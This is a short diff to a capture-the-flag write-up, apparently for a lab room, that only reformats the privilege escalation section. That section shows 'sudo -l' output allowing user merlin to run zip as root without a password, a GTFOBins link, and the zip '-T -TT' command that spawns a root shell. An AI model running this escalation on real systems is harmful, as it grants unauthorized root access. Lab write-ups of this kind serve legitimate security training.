@@ -118,7 +118,7 @@ user.txt
 ```
 ### TASK 2
 
-PRIVESC
+####PRIVESC
 ```
 sudo -l
 
@@ -128,9 +128,9 @@ Matching Defaults entries for merlin on ubuntu:
 
 User merlin may run the following commands on ubuntu:
     (root : root) NOPASSWD: /usr/bin/zip
-
-(https://gtfobins.github.io/gtfobins/zip/#sudo)
-
+```
+https://gtfobins.github.io/gtfobins/zip/#sudo
+```
 TF=$(mktemp -u)
 sudo zip $TF /etc/hosts -T -TT 'sh #'
 sudo rm $TF
